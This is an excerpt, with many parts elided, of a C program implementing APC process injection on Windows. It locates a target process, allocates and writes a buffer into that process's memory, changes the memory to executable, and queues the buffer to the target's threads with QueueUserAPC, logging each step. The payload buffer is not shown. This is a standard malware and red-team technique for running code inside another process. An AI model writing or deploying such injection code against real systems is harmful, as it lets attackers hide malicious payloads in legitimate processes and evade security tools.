...
int main()
{
	...
	if (Process32First(hSnap, &pe32))
	{
		...
		OKAY("Success in finding process!");
	}
	...
	rBuffer = VirtualAllocEx(hProcess, NULL, pSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (rBuffer == NULL)
	{
	...
	BOOL bWriteMem = WriteProcessMemory(hProcess, rBuffer, buffer, pSize, NULL);
	if (!bWriteMem)
	{
		...
		OKAY("Successfully wrote %zu bytes into the target process.", pSize);
	}

	BOOL bVirtualProtect = VirtualProtectEx(hProcess, rBuffer, pSize, PAGE_EXECUTE_READ, &dwOldProtect);
	if (!bVirtualProtect)
	{
		WARN("Failed to Change Memory Protection from RW to RX: %d", GetLastError());
		return 1;
	}
	else {
	...
	if (Thread32First(hSnap, &te32))
	{
		do
		{
			if (te32.th32OwnerProcessID == pe32.th32ProcessID)
			{
				...
				OKAY("Current TID: %ld", te32.th32ThreadID);

				if (hThread == NULL)
				{
					WARN("OpenThread Failed...");
					return EXIT_FAILURE;
				}

				QueueUserAPC((PAPCFUNC)rBuffer, hThread, NULL);
...
cleanup:
	...
	{
		CloseHandle(hSnap);
		INFO("[0x%p] Closed Snapshot Handle", hSnap);
	}
	...
	if (rBuffer)
	{
		...
		INFO("[0x%p] allocated buffer freed", rBuffer);
	}
